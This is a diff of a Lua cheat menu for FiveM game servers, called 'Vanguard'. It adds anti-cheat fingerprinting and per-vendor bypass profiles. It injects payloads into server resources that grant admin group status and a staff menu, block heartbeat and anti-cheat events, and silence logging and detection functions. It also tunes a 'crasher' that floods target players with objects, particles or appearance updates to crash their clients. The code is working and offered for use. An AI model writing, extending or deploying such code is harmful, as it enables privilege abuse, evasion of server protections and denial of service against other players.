@@ -16001,7 +16001,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-22 21:53:14
+-- Generated: 2026-10-22 22:53:21
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -16311,6 +16311,7 @@ S.observed = {}     -- event name -> { count, first, last, minGap, maxGap }
 local HINTS = {
     -- vendor fingerprint fragments. Lowercase. These are not resource names:
     -- they are substrings of the metadata a guard publishes about itself.
+    { vendor = "raven",      keys = { "raven", "ravenac", "raven anticheat" } },
     { vendor = "waveshield", keys = { "waveshield" } },
     { vendor = "fiveguard",  keys = { "fiveguard", "fiveguard.net" } },
     { vendor = "eagle",      keys = { "eagle", "ec-ac", "ec_ac" } },
@@ -16373,6 +16374,26 @@ function S.scan()
 
             local vName = matchVendor(resource)
             if vName then vendor = vendor or vName; score = score + 2 end
+
+            -- Server-specific names are exact: rac is Reason AC, Putin is the
+            -- Dynasty AC, and Raven is its own resource. They must not be
+            -- merged with one another.
+            if resource == "rac" then
+                vendor = vendor or "reason"
+                score = score + 6
+            elseif resource == "raven" or resource == "ravenac" then
+                vendor = vendor or "raven"
+                score = score + 6
+            end
+
+            local lowerResource = string.lower(resource)
+            if lowerResource == "seed" then
+                vendor = vendor or "seed"
+                score = score + 4
+            elseif lowerResource == "dynastie" or lowerResource == "putin" then
+                vendor = vendor or "dynasty"
+                score = score + 4
+            end
 
             if score > 0 then
                 S.acs[#S.acs + 1] = {
@@ -17933,6 +17954,31 @@ end
 
 V.profiles = {
 
+    raven = profile {
+        label = "Raven", confidence = "documented",
+        vector = "Raven Anticheat resource, client heartbeat, native/env integrity, entity and event validation",
+        technique = "no injection, no native hook, no spoof; only Raven's documented client teleport-grace export",
+        hooks = {},
+        keys = "none", events = "never block the heartbeat",
+        residual = "only movement checks are covered; model, entity, weapon and event checks remain server-side",
+    },
+
+    seed = profile {
+        label = "Seed", confidence = "server-specific",
+        vector = "Seed RP server client checks",
+        technique = "separate Seed client patch injected only into the seed resource",
+        hooks = {}, keys = "server-specific", events = "never block the heartbeat",
+        residual = "server-specific patch; keep it separate from the commercial AC profiles",
+    },
+
+    dynasty = profile {
+        label = "Dynasty", confidence = "server-specific",
+        vector = "Dynasty server Putin staff resource",
+        technique = "separate Putin staff injection",
+        hooks = {}, keys = "server-specific", events = "never block the heartbeat",
+        residual = "server-specific staff injection; not a generic AC bypass",
+    },
+
     waveshield = profile {
         label = "WaveShield", confidence = "verified",
         vector = "state cache + periodic detectors + strike systems + protected-native stack checks + 15s heartbeat",
@@ -18217,6 +18263,129 @@ function V.applyGlobal()
     return plans
 end
 
+-- ---------------------------------------------------------------------------
+-- PER-PROFILE ACTIONS
+--
+-- Every entry applies exactly one vendor. There is no "apply all" path in the
+-- menu: a WaveShield profile cannot be applied to a Raven server by accident.
+-- ---------------------------------------------------------------------------
+function V.applyVendor(vendor)
+    S.scan()
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        if ac.vendor == vendor then
+            return V.apply(ac)
+        end
+    end
+    O.log("profile %s: matching resource not detected", tostring(vendor))
+    return nil
+end
+
+-- Dynasty is a server, not Raven. The old Dynasty category used the server's
+-- "Putin" staff resource; keep that action isolated from Seed and from Raven.
+V.dynastyPayload = [==[
+GameMode            = GameMode or {}
+GameMode.PlayerData = GameMode.PlayerData or {}
+GameMode.PlayerData.group = "admin"
+AdminSystem = AdminSystem or {}
+AdminSystem.Service = AdminSystem.Service or {}
+AdminSystem.Service.enabled = true
+ToggleMenu("staff")
+]==]
+
+function V.applyDynasty()
+    if GetResourceState("Putin") ~= "started" then
+        O.log("dynasty: Putin resource is not started")
+        return false
+    end
+
+    local api = rawget(_G, "Susano")
+    if type(api) ~= "table" or type(api.InjectResource) ~= "function" then
+        O.log("dynasty: Susano.InjectResource unavailable")
+        return false
+    end
+
+    local injectionType = api.InjectionType
+    local ok, result
+    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
+        ok, result = pcall(api.InjectResource, "Putin", V.dynastyPayload, injectionType.NEW_THREAD)
+    else
+        ok, result = pcall(api.InjectResource, "Putin", V.dynastyPayload)
+    end
+
+    if not ok or result == false then
+        O.log("dynasty: injection failed: %s", tostring(result))
+        return false
+    end
+
+    O.log("dynasty: staff menu injected into Putin")
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- RAVEN
+--
+-- Raven is its own AC resource. There is no public client-side "disable Raven"
+-- export. The only documented client export is the movement grace window. This
+-- uses that export and nothing else: no injection into the resource, no native
+-- hook, no heartbeat block, no spoofed model. Reason AC (`rac`) is a different
+-- entry and is never used here.
+-- ---------------------------------------------------------------------------
+V.ravenActive = false
+V.ravenThread = false
+V.ravenTarget = nil
+
+local function findRaven()
+    S.scan()
+    for i = 1, #S.acs do
+        local ac = S.acs[i]
+        if ac.vendor == "raven" then return ac end
+    end
+    return nil
+end
+
+function V.setRaven(enabled)
+    if not enabled then
+        V.ravenActive = false
+        O.log("raven: grace off")
+        return true
+    end
+
+    local ac = findRaven()
+    if not ac then
+        O.log("raven: Raven resource not found; nothing applied")
+        return false
+    end
+
+    V.ravenTarget = ac.resource
+    V.ravenActive = true
+
+    local function pulse()
+        if not V.ravenActive or not V.ravenTarget then return end
+        local ok = pcall(function()
+            return exports[V.ravenTarget]:SetPlayerTeleported(300)
+        end)
+        if not ok then
+            O.log("raven: SetPlayerTeleported unavailable on %s", V.ravenTarget)
+        end
+    end
+
+    pulse()
+
+    if V.ravenThread then return true end
+    V.ravenThread = true
+    Citizen.CreateThread(function()
+        while V.ravenActive do
+            Citizen.Wait(240000)
+            if V.ravenActive then pulse() end
+        end
+        V.ravenThread = false
+    end)
+
+    O.log("raven: movement grace on %s", V.ravenTarget)
+    return true
+end
+
 function V.report()
     local out = {}
     for i = 1, #S.acs do
@@ -18386,20 +18555,23 @@ local C = (function(O,E)
 local C = {}
 
 local PRESETS = {
-    { name = "Light",    scale = 0.65, startCreate = 8,  maxCreate = 14, startFx = 4, maxFx = 8,  bagKB = 8,   duration = 5000,  gapMin = 200, gapMax = 420 },
-    { name = "Standard", scale = 1.00, startCreate = 12, maxCreate = 18, startFx = 6, maxFx = 10, bagKB = 24,  duration = 8000,  gapMin = 150, gapMax = 320 },
-    { name = "Heavy",    scale = 1.35, startCreate = 14, maxCreate = 22, startFx = 8, maxFx = 12, bagKB = 64,  duration = 12000, gapMin = 110, gapMax = 240 },
-    { name = "Overkill", scale = 2.00, startCreate = 18, maxCreate = 24, startFx = 10, maxFx = 14, bagKB = 128, duration = 16000, gapMin = 90,  gapMax = 200 },
+    { name = "Light",    scale = 0.65, startCreate = 8,  maxCreate = 14, startFx = 4, maxFx = 8,  bagKB = 8,   duration = 8000,  gapMin = 200, gapMax = 420 },
+    { name = "Standard", scale = 1.00, startCreate = 12, maxCreate = 18, startFx = 6, maxFx = 10, bagKB = 24,  duration = 12000, gapMin = 150, gapMax = 320 },
+    { name = "Heavy",    scale = 1.35, startCreate = 14, maxCreate = 22, startFx = 8, maxFx = 12, bagKB = 64,  duration = 16000, gapMin = 110, gapMax = 240 },
+    { name = "Overkill", scale = 2.00, startCreate = 18, maxCreate = 24, startFx = 10, maxFx = 14, bagKB = 128, duration = 20000, gapMin = 90,  gapMax = 200 },
 }
 
--- Only three methods are exposed. Peds and vehicles are deliberately absent:
+-- Only three methods are exposed. Spawned peds and vehicles are absent:
 -- `Spoofed model detected` was the first ban reason seen in the field, and a
--- normal ped/vehicle flood is still a model-spawn signature. Objects and
--- particles do not use a SpoofedPed/SpoofedVehicle path at all.
+-- normal ped/vehicle flood is still a model-spawn signature. The first method
+-- creates no entity at all; the other two use objects or particles without a
+-- SpoofedPed/SpoofedVehicle path.
 local METHODS = {
-    { label = "Objects (orbit)", pool = { obj = 10 }, fx = false, bag = false },
-    { label = "Objects (flood)", pool = { obj = 18 }, fx = false, bag = false },
-    { label = "PTFX storm",      pool = {},           fx = true,  bag = false },
+    -- No entity is created. The local ped is used as the source of the clone
+    -- updates, which avoids the server-side spawn counters entirely.
+    { label = "Ped variation", pool = {}, fx = false, bag = false, pedvar = true },
+    { label = "Objects (flood)", pool = { obj = 22 }, fx = false, bag = false, remote = true  },
+    { label = "PTFX storm",      pool = {},           fx = true,  bag = false, remote = true  },
 }
 
 C.METHODS = METHODS
@@ -18411,7 +18583,7 @@ C.chatShield = true
 C.targets = {}
 C.index = 1
 C.pool = {}
-C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0 }
+C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, variations = 0 }
 C.channels = { spawn = nil, fx = nil, bag = nil }
 C.running = false
 
@@ -18625,12 +18797,23 @@ local function spawnPed()
     return ped, "ped"
 end
 
-local function spawnObject()
+local function spawnObject(target)
     local model = OBJ_MODELS[math.random(1, #OBJ_MODELS)]
     local hash = GetHashKey(model)
     if not E.requestModel(hash, 1600) then return nil end
 
-    local x, y, z = spawnPos()
+    local x, y, z
+    local method = METHODS[C.method]
+    if method and method.remote and target and target.ped then
+        -- Flood method: place the load in the target's own streaming radius.
+        -- This is deliberately not the birth-local orbit path; the test server
+        -- showed that a distant owner could lose the object before the target
+        -- ever streamed it.
+        x, y, z = ring(GetEntityCoords(target.ped), 4.5, 0.2, 2.8)
+    else
+        x, y, z = spawnPos()
+    end
+
     local obj = CreateObjectNoOffset(hash, x, y, z, true, true, false)
     SetModelAsNoLongerNeeded(hash)
 
@@ -18639,6 +18822,8 @@ local function spawnObject()
     registerNet(obj)
     protectLocal(obj)
     pcall(SetEntityDynamic, obj, true)
+    pcall(SetEntityInvincible, obj, true)
+    pcall(ActivatePhysics, obj)
     return obj, "object"
 end
 
@@ -18671,7 +18856,7 @@ local function spawnVehicle()
     return veh, "vehicle"
 end
 
-local function spawnOne(kind)
+local function spawnOne(kind, target)
     if not reserve("create") then return nil end
     C.stats.attempts = (C.stats.attempts or 0) + 1
 
@@ -18681,7 +18866,7 @@ local function spawnOne(kind)
     elseif kind == "veh" then
         handle, actual = spawnVehicle()
     else
-        handle, actual = spawnObject()
+        handle, actual = spawnObject(target)
     end
 
     if not handle then
@@ -18857,7 +19042,7 @@ function C.ensurePool(target)
     local kind = nextKind()
     if not kind then return false end
 
-    local handle, actual = spawnOne(kind)
+    local handle, actual = spawnOne(kind, target)
     if not handle then
         grow("create")
         return false
@@ -18927,12 +19112,74 @@ function C.cleanup()
 end
 
 -- ---------------------------------------------------------------------------
+-- PED VARIATION
+--
+-- No entity is created. Clone updates for the local ped are forced through
+-- component and prop changes; nearby clients have to process the update stream.
+-- The original appearance is restored at the end of the run.
+-- ---------------------------------------------------------------------------
+function C.pedVariation(target)
+    local ped = PlayerPedId()
+    if not ped or ped == 0 or not DoesEntityExist(ped) then return false end
+
+    local snapshot = { components = {}, props = {} }
+    for component = 0, 11 do
+        snapshot.components[component] = {
+            drawable = GetPedDrawableVariation(ped, component),
+            texture = GetPedTextureVariation(ped, component),
+        }
+    end
+    for prop = 0, 7 do
+        snapshot.props[prop] = {
+            index = GetPedPropIndex(ped, prop),
+            texture = GetPedPropTextureIndex(ped, prop),
+        }
+    end
+
+    local deadline = now() + preset().duration
+    while C.running and now() < deadline do
+        for _ = 1, 24 do
+            local component = math.random(0, 11)
+            local maxDrawable = 0
+            local maxTexture = 0
+            pcall(function()
+                maxDrawable = GetNumberOfPedDrawableVariations(ped, component) or 0
+                maxTexture = GetNumberOfPedTextureVariations(ped, component, 0) or 0
+            end)
+
+            local drawable = maxDrawable > 0 and math.random(0, maxDrawable - 1) or 0
+            local texture = maxTexture > 0 and math.random(0, maxTexture - 1) or 0
+            pcall(SetPedComponentVariation, ped, component, drawable, texture, 0)
+
+            local prop = math.random(0, 7)
+            pcall(SetPedPropIndex, ped, prop, math.random(0, 8), math.random(0, 8), true)
+            C.stats.variations = C.stats.variations + 1
+        end
+
+        C.stats.peaks = C.stats.peaks + 1
+        if not C.target() then break end
+        Citizen.Wait(math.max(60, preset().gapMin))
+    end
+
+    for component = 0, 11 do
+        local value = snapshot.components[component]
+        pcall(SetPedComponentVariation, ped, component, value.drawable, value.texture, 0)
+    end
+    for prop = 0, 7 do
+        local value = snapshot.props[prop]
+        pcall(SetPedPropIndex, ped, prop, value.index, value.texture, true)
+    end
+
+    return true
+end
+
+-- ---------------------------------------------------------------------------
 -- RUN
 -- ---------------------------------------------------------------------------
 
 local function runBody()
     C.running = true
-    C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, attempts = 0 }
+    C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, attempts = 0, variations = 0 }
     C.resetCaps()
     buildSequence()
 
@@ -18944,6 +19191,14 @@ local function runBody()
     end
 
     O.log("crash: %s / %s -> %s", METHODS[C.method].label, preset().name, target.name)
+
+    if METHODS[C.method].pedvar then
+        C.pedVariation(target)
+        C.running = false
+        O.log("crash: done %d variations, %d peaks, %d fails",
+            C.stats.variations, C.stats.peaks, C.stats.fails)
+        return
+    end
 
     if METHODS[C.method].bag then
         C.spawnAnchor(target)
@@ -20265,20 +20520,584 @@ return ST
 end)(O)
 
 -- ---------------------------------------------------------------------------
+-- PART: 13_seed.lua
+-- ---------------------------------------------------------------------------
+local SB = (function(O)
+-- ============================================================================
+-- VANGUARD / 13 SEED BYPASS
+-- ----------------------------------------------------------------------------
+-- Server-specific Seed client patch, derived from:
+--   C:\Users\caca\Documents\AC\bypass_seed.lua
+--
+-- The yellow overlay and the Ham.getAntiCheats notification were removed. The
+-- payload is injected only into the "seed" resource, only when the operator
+-- clicks the Seed entry in Exploit > Bypass. It is not loaded at boot.
+-- ============================================================================
+
+local SB = {}
+
+SB._injected = false
+
+SB.code = [==[
+local blockedEvents = {
+    "st",
+    "hb",
+    "iven",
+    "it",
+    "fc",
+    "rcm",
+    "sm",
+    "blev",
+    "playerTookDamage",
+    "playerEnteredVehicleNow",
+    "playerLeftVehicle",
+    "guardian",
+    "rollback",
+    "rb",
+    "revert",
+    "restore",
+    "sync",
+    "checkpoint"
+}
+
+local originalTriggerServerEvent = TriggerServerEvent
+_G.TriggerServerEvent = function(eventName, ...)
+    if not eventName then
+        return originalTriggerServerEvent(eventName, ...)
+    end
+    
+    local lowerEventName = string.lower(tostring(eventName))
+    for _, blockedName in ipairs(blockedEvents) do
+        if string.find(lowerEventName, string.lower(blockedName), 1, true) then
+            return
+        end
+    end
+    
+    return originalTriggerServerEvent(eventName, ...)
+end
+
+for _, eventName in ipairs(blockedEvents) do
+    RegisterNetEvent(eventName)
+    AddEventHandler(eventName, function()
+        return
+    end)
+end
+
+local originalSetEntityCoords = SetEntityCoords
+_G.SetEntityCoords = function(entity, x, y, z, xAxis, yAxis, zAxis, clearArea)
+    if entity == PlayerPedId() then
+        return
+    end
+    return originalSetEntityCoords(entity, x, y, z, xAxis, yAxis, zAxis, clearArea)
+end
+
+_G.AttachEntityToEntity = function(...)
+    return
+end
+
+_G.NetworkSetEntityMaxHealth = function(...)
+    return
+end
+
+local originalSetEntityHealth = SetEntityHealth
+_G.SetEntityHealth = function(entity, health)
+    if entity == PlayerPedId() then
+        return
+    end
+    return originalSetEntityHealth(entity, health)
+end
+
+local originalDeleteEntity = DeleteEntity
+_G.DeleteEntity = function(entity)
+    if entity == PlayerPedId() then
+        return
+    end
+    return originalDeleteEntity(entity)
+end
+
+_G.SmashVehicleWindow = function(...)
+    return
+end
+
+_G.SmashVehicleDoor = function(...)
+    return
+end
+
+if IO then
+    IO.Info = function(...) return end
+    IO.Warn = function(...) return end
+    IO.Error = function(...) return end
+    IO.Debug = function(...) return end
+end
+
+_G.print = function(...)
+    return
+end
+
+Citizen.CreateThread(function()
+    local lastTime = 0
+    local lastCoords = nil
+
+    while true do
+        local playerPed = PlayerPedId()
+        local vehicle = GetVehiclePedIsIn(playerPed, false) or 0
+        local currentTime = GetGameTimer()
+        local currentCoords = GetEntityCoords(playerPed)
+
+        if lastCoords then
+            if #(currentCoords - lastCoords) > 50.0 then
+                SetEntityCoords(playerPed, lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
+            end
+        end
+        lastCoords = currentCoords
+
+        local health = GetEntityHealth(playerPed)
+        if health < 190 then
+            SetEntityHealth(playerPed, 200)
+        end
+
+        if currentTime - lastTime > 500 then
+            for componentId = 0, 11 do
+                pcall(function()
+                    SetPedComponentVariation(playerPed, componentId, GetPedDrawableVariation(playerPed, componentId), GetPedTextureVariation(playerPed, componentId), 0)
+                end)
+            end
+
+            for propId = 0, 7 do
+                pcall(function()
+                    SetPedPropIndex(playerPed, propId, GetPedPropIndex(playerPed, propId), GetPedPropTextureIndex(playerPed, propId) or 0, true)
+                end)
+            end
+            lastTime = currentTime
+        end
+
+        pcall(function()
+            SetPedConfigFlag(playerPed, 342, false)
+            SetPedConfigFlag(playerPed, 243, false)
+            SetPedConfigFlag(playerPed, 32, false)
+            SetPedConfigFlag(playerPed, 227, false)
+        end)
+
+        pcall(function()
+            SetPedCanRagdoll(playerPed, true)
+        end)
+
+        if vehicle ~= 0 then
+            pcall(function()
+                if NetworkRequestControlOfEntity and not NetworkHasControlOfEntity(vehicle) then
+                    NetworkRequestControlOfEntity(vehicle)
+                end
+                if SetEntityAsMissionEntity then
+                    SetEntityAsMissionEntity(vehicle, true, true)
+                end
+                if SetVehicleDoorsLocked then
+                    SetVehicleDoorsLocked(vehicle, 1)
+                end
+                if SetVehicleDoorsLockedForAllPlayers then
+                    SetVehicleDoorsLockedForAllPlayers(vehicle, false)
+                end
+            end)
+        end
+
+        pcall(function()
+            if OnesyncEnableRemoteAttachmentSanitization then
+                OnesyncEnableRemoteAttachmentSanitization(false)
+            end
+        end)
+
+        Wait(0)
+    end
+end)
+
+Citizen.CreateThread(function()
+    Wait(3500)
+    pcall(function()
+        if SetLocalPlayerCanCollectPortablePickups then
+            SetLocalPlayerCanCollectPortablePickups(true)
+        end
+
+        local pickups = {
+            "PICKUP_WEAPON_ASSAULTRIFLE",
+            "PICKUP_WEAPON_CARBINERIFLE",
+            "PICKUP_HEALTH_STANDARD",
+            "PICKUP_ARMOUR_STANDARD",
+            "PICKUP_MONEY_VARIABLE"
+        }
+        
+        local playerId = PlayerId()
+        for _, pickupName in ipairs(pickups) do
+            local pickupHash = GetHashKey(pickupName)
+            if ToggleUsePickupsForPlayer then
+                ToggleUsePickupsForPlayer(playerId, pickupHash, true)
+            end
+            if SuppressPickupRewardType then
+                SuppressPickupRewardType(pickupHash)
+            end
+        end
+    end)
+end)
+
+RegisterCommand("prop", function(source, args)
+    if not args[1] then
+        return
+    end
+    pcall(function()
+        local propName = args[1]
+        local propHash = GetHashKey(propName)
+        RequestModel(propHash)
+        
+        local loadTime = GetGameTimer()
+        while not HasModelLoaded(propHash) do
+            if GetGameTimer() > loadTime + 4000 then
+                break
+            end
+            Wait(10)
+        end
+        
+        if HasModelLoaded(propHash) then
+            local playerPed = PlayerPedId()
+            local coords = GetEntityCoords(playerPed)
+            local propEntity = CreateObject(propHash, coords.x + 1.5, coords.y, coords.z, true, true, false)
+            
+            if DoesEntityExist(propEntity) then
+                PlaceObjectOnGroundProperly(propEntity)
+                FreezeEntityPosition(propEntity, true)
+            end
+            SetModelAsNoLongerNeeded(propHash)
+        end
+    end)
+end, false)
+
+Citizen.CreateThread(function()
+    Wait(5000)
+    collectgarbage("collect")
+    pcall(function()
+        if _G.checkClothesDiff then
+            _G.checkClothesDiff = function(...) return end
+        end
+        if _G.detectedFatalMeleeAttack then
+            _G.detectedFatalMeleeAttack = function(...) return end
+        end
+    end)
+end)
+
+]==]
+
+-- Susano only. Nothing is injected until the Seed entry is clicked.
+local function susano()
+    local api = rawget(_G, "Susano")
+    if type(api) == "table" and type(api.InjectResource) == "function" then
+        return api
+    end
+    return nil
+end
+
+function SB.apply()
+    if GetResourceState("seed") ~= "started" then
+        O.log("seed bypass: seed resource is not started")
+        return false
+    end
+
+    if SB._injected then
+        O.log("seed bypass: already injected this session")
+        return true
+    end
+
+    local api = susano()
+    if not api then
+        O.log("seed bypass: Susano.InjectResource unavailable")
+        return false
+    end
+
+    local injectionType = api.InjectionType
+    local ok, result
+    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
+        ok, result = pcall(api.InjectResource, "seed", SB.code, injectionType.NEW_THREAD)
+    else
+        ok, result = pcall(api.InjectResource, "seed", SB.code)
+    end
+
+    if not ok then
+        O.log("seed bypass: injection failed: %s", tostring(result))
+        return false
+    end
+    if result == false then
+        O.log("seed bypass: Susano.InjectResource returned false")
+        return false
+    end
+
+    SB._injected = true
+    O.log("seed bypass: injected into seed")
+    return true
+end
+
+return SB
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 14_vehicle_spoof.lua
+-- ---------------------------------------------------------------------------
+local VS = (function(O)
+-- ============================================================================
+-- VANGUARD / 14 VEHICLE SPOOF
+-- ----------------------------------------------------------------------------
+-- Local visual model swap without changing the networked model.
+--
+--   server / other players : the current networked vehicle (any model)
+--   local client           : Deluxo (non-networked visual proxy attached to it)
+--
+-- The current vehicle remains the only vehicle the server knows. The Deluxo is
+-- created with isNetwork=false, has no network ID and is never registered as a
+-- networked entity. The local client drives the current vehicle; the Deluxo
+-- proxy follows it. If the player is on foot, a normal networked Sultan is
+-- spawned as the fallback carrier.
+--
+-- Flight is emulated on the carrier by disabling its gravity and applying a
+-- local velocity from the movement controls. Other clients therefore see the
+-- carrier flying, while the local client sees the Deluxo proxy in the same
+-- position. This is not a Deluxo model on the server and it does not use
+-- Susano.CreateSpoofedVehicle or Susano.SpoofPed.
+-- ============================================================================
+
+local VS = {}
+
+VS.enabled = false
+VS.net = 0
+VS.localVeh = 0
+VS.thread = false
+
+local FLY_FORWARD = 71
+local FLY_BACK = 72
+local FLY_LEFT = 63
+local FLY_RIGHT = 64
+local FLY_UP = 22
+local FLY_DOWN = 36
+local FLY_BOOST = 21
+
+local function modelHash(name)
+    return GetHashKey(name)
+end
+
+local function requestModel(hash, timeout)
+    if not hash or hash == 0 then return false end
+    if IsModelInCdimage and not IsModelInCdimage(hash) then return false end
+
+    RequestModel(hash)
+    local deadline = GetGameTimer() + (timeout or 3000)
+    while not HasModelLoaded(hash) do
+        if GetGameTimer() > deadline then return false end
+        Citizen.Wait(0)
+    end
+    return true
+end
+
+local function makeNetworkCarrier()
+    local ped = PlayerPedId()
+    local current = GetVehiclePedIsIn(ped, false)
+
+    -- Any current vehicle can be the network carrier: Sultan, car, bike,
+    -- helicopter, boat, etc. We do not force a model.
+    if current ~= 0 and DoesEntityExist(current) then
+        return current, false
+    end
+
+    -- On foot there is no network model to reuse. A normal Sultan is spawned
+    -- only as a neutral fallback so the feature still works from the menu.
+    local fallbackHash = modelHash("sultan")
+    if not requestModel(fallbackHash, 4000) then
+        O.log("vehicle spoof: fallback model unavailable")
+        return 0, false
+    end
+
+    local x, y, z = GetEntityCoords(ped)
+    local heading = GetEntityHeading(ped)
+    local vehicle = CreateVehicle(fallbackHash, x, y, z, heading, true, true)
+    SetModelAsNoLongerNeeded(fallbackHash)
+
+    if not vehicle or vehicle == 0 or not DoesEntityExist(vehicle) then
+        O.log("vehicle spoof: fallback creation failed")
+        return 0, false
+    end
+
+    pcall(SetEntityAsMissionEntity, vehicle, true, true)
+    pcall(NetworkRegisterEntityAsNetworked, vehicle)
+    local netId = 0
+    pcall(function() netId = NetworkGetNetworkIdFromEntity(vehicle) end)
+    if netId and netId > 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+        pcall(SetNetworkIdCanMigrate, netId, true)
+    end
+    pcall(SetVehicleOnGroundProperly, vehicle)
+    pcall(SetPedIntoVehicle, ped, vehicle, -1)
+
+    return vehicle, true
+end
+
+local function makeLocalDeluxo(netVehicle)
+    local deluxoHash = modelHash("deluxo")
+    if not requestModel(deluxoHash, 4000) then
+        O.log("vehicle spoof: deluxo model unavailable")
+        return 0
+    end
+
+    local x, y, z = GetEntityCoords(netVehicle)
+    local heading = GetEntityHeading(netVehicle)
+    local vehicle = CreateVehicle(deluxoHash, x, y, z, heading, false, false)
+    SetModelAsNoLongerNeeded(deluxoHash)
+
+    if not vehicle or vehicle == 0 or not DoesEntityExist(vehicle) then
+        O.log("vehicle spoof: local deluxo creation failed")
+        return 0
+    end
+
+    pcall(SetEntityAsMissionEntity, vehicle, true, true)
+    pcall(SetEntityInvincible, vehicle, true)
+    pcall(SetEntityCollision, vehicle, false, false)
+    pcall(SetEntityLocallyVisible, vehicle)
+    pcall(AttachEntityToEntity, vehicle, netVehicle, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
+        false, false, false, false, 2, true)
+
+    return vehicle
+end
+
+local function stopFlight()
+    VS.enabled = false
+
+    local localVehicle = VS.localVeh
+    if localVehicle and localVehicle ~= 0 and DoesEntityExist(localVehicle) then
+        pcall(DetachEntity, localVehicle, true, false)
+        pcall(DeleteVehicle, localVehicle)
+    end
+    VS.localVeh = 0
+
+    local netVehicle = VS.net
+    if netVehicle and netVehicle ~= 0 and DoesEntityExist(netVehicle) then
+        pcall(SetEntityLocallyVisible, netVehicle)
+        pcall(SetEntityGravity, netVehicle, 1.0)
+        pcall(SetVehicleGravity, netVehicle, true)
+        pcall(SetVehicleGravityAmount, netVehicle, 1.0)
+        pcall(SetEntityVelocity, netVehicle, 0.0, 0.0, 0.0)
+        pcall(SetVehicleEngineOn, netVehicle, true, true, true)
+    end
+    VS.net = 0
+
+    O.log("vehicle spoof: off")
+    return true
+end
+
+function VS.disable()
+    return stopFlight()
+end
+
+local function flightLoop()
+    while VS.enabled do
+        local netVehicle = VS.net
+        local localVehicle = VS.localVeh
+        local ped = PlayerPedId()
+
+        if not netVehicle or netVehicle == 0 or not DoesEntityExist(netVehicle)
+            or not localVehicle or localVehicle == 0 or not DoesEntityExist(localVehicle)
+            or GetVehiclePedIsIn(ped, false) ~= netVehicle then
+            stopFlight()
+            break
+        end
+
+        pcall(SetVehicleGravity, netVehicle, false)
+        pcall(SetVehicleGravityAmount, netVehicle, 0.0)
+        pcall(SetEntityGravity, netVehicle, 0.0)
+        pcall(SetVehicleEngineOn, netVehicle, false, true, true)
+
+        local forward = GetEntityForwardVector(netVehicle)
+        local rightX, rightY = forward.y, -forward.x
+        local speed, strafe, lift = 0.0, 0.0, 0.0
+
+        if IsControlPressed(0, FLY_FORWARD) then speed = speed + 5.0 end
+        if IsControlPressed(0, FLY_BACK) then speed = speed - 3.0 end
+        if IsControlPressed(0, FLY_LEFT) then strafe = strafe - 3.0 end
+        if IsControlPressed(0, FLY_RIGHT) then strafe = strafe + 3.0 end
+        if IsControlPressed(0, FLY_UP) then lift = lift + 2.5 end
+        if IsControlPressed(0, FLY_DOWN) then lift = lift - 2.5 end
+        if IsControlPressed(0, FLY_BOOST) then speed = speed * 1.6 end
+
+        local vx = forward.x * speed + rightX * strafe
+        local vy = forward.y * speed + rightY * strafe
+        pcall(SetEntityVelocity, netVehicle, vx, vy, lift)
+
+        -- If the proxy lost its attachment, keep it on the networked vehicle.
+        if not IsEntityAttached(localVehicle) then
+            local x, y, z = GetEntityCoords(netVehicle)
+            pcall(SetEntityCoordsNoOffset, localVehicle, x, y, z, false, false, false)
+            pcall(SetEntityHeading, localVehicle, GetEntityHeading(netVehicle))
+        end
+
+        Citizen.Wait(0)
+    end
+    VS.thread = false
+end
+
+function VS.enable()
+    if VS.enabled then return true end
+
+    local netVehicle, spawned = makeNetworkCarrier()
+    if netVehicle == 0 then return false end
+
+    local localVehicle = makeLocalDeluxo(netVehicle)
+    if localVehicle == 0 then
+        if spawned and DoesEntityExist(netVehicle) then
+            pcall(DeleteVehicle, netVehicle)
+        end
+        return false
+    end
+
+    VS.net = netVehicle
+    VS.localVeh = localVehicle
+    VS.enabled = true
+
+    pcall(SetEntityLocallyInvisible, netVehicle)
+    pcall(SetVehicleGravity, netVehicle, false)
+    pcall(SetVehicleGravityAmount, netVehicle, 0.0)
+    pcall(SetEntityGravity, netVehicle, 0.0)
+    pcall(SetVehicleEngineOn, netVehicle, false, true, true)
+
+    if not VS.thread then
+        VS.thread = true
+        Citizen.CreateThread(flightLoop)
+    end
+
+    O.log("vehicle spoof: network carrier / deluxo local")
+    return true
+end
+
+function VS.toggle(value)
+    if value then return VS.enable() end
+    return VS.disable()
+end
+
+function VS.status()
+    if not VS.enabled then return "Spoofed Deluxo: off" end
+    return "Spoofed Deluxo: current vehicle network / Deluxo local"
+end
+
+return VS
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
 -- PART: 07_menu.lua
 -- ---------------------------------------------------------------------------
-local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,Menu)
+local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,Menu)
 -- ============================================================================
 -- VANGUARD / 07 MENU
 -- ----------------------------------------------------------------------------
 -- This file no longer creates a "Vanguard" category. The features are placed
 -- in the menu the operator already uses:
 --
---   Exploit > Bypass    one entry per detected guard; clicking it applies the
---                       profile immediately (no separate "load" step)
---   Exploit > Exploits  the Seed staff item, using the existing dynasty frame
+--   Exploit > Bypass    separate profiles: WaveShield, FiveGuard, Electron AC,
+--                       Reason AC, Seed, Dynasty, Raven; each target is isolated
+--   Exploit > Exploits  Menu Staff [SEED], no false Dynasty badge
 --   Protection          anti-freeze, anti-attach and anti-spectate only
---   Crasher             one method selector and one crash button
+--   Crasher             one direct action per method, no select + Crash step
+--   Vehicle > Spoofed   local Deluxo proxy over a normal networked Sultan
 --
 -- Removed on purpose:
 --   * native hooks / read repair / hook jitter
@@ -20413,41 +21232,62 @@ end
